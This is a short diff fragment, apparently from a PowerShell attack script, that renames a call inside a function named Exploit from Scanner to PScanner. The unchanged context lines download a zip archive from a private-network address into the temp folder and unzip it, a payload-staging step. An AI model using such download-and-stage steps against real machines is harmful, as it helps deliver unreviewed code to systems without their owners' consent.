@@ -317,7 +317,7 @@ function Exploit(){
 
 InterfacesFinder
 powershell  Start-Sleep 1 ;
-Scanner
+PScanner
 powershell  Start-Sleep 1 ;
 Invoke-WebRequest 'http://172.16.64.1/a.zip' -OutFile "$env:TEMP\a.zip"
 Unzip $env:Tmp"\a.zip" $env:Tmp"\"
